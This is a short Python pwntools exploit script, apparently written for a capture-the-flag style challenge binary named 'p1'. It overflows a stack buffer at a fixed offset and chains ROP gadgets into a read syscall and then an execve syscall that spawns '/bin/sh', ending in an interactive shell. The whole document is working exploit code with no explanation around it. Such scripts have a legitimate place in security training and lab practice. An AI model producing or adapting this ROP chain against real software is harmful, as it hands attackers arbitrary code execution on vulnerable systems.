#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
p = process('./p1')
elf = ELF('./p1')
g = lambda x: next(elf.search(asm(x)))
pop_eax_ret = g('pop eax ; ret') # 0x080b8126
pop_ebx_ret = g('pop ebx ; ret') # 0x080481c9
pop_ecx_ret = g('pop ecx ; ret') # 0x080de849
pop_edx_ret = g('pop edx ; ret') # 0x0806edca
int_0x80_ret = g('int 0x80 ; ret') 
buf = 0x080eb000 - 100
raw_input('@')
offset = 62
# read(0, '/bin/sh\x00', 100)
rop1 = [
	pop_eax_ret, 
	3, 
	pop_ebx_ret, 
	0, 
	pop_ecx_ret, 
	buf, 
	pop_edx_ret, 
	100, 
	int_0x80_ret, 
]
# execve('/bin/sh\x00', 0, 0)
rop2 = [
	pop_eax_ret, 
	0xb, 
	pop_ebx_ret, 
	buf, 
	pop_ecx_ret, 
	0, 
	pop_edx_ret, 
	0, 
	int_0x80_ret
]
payload = 'A' * offset + ''.join(map(p32, rop1)) + ''.join(map(p32, rop2))
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
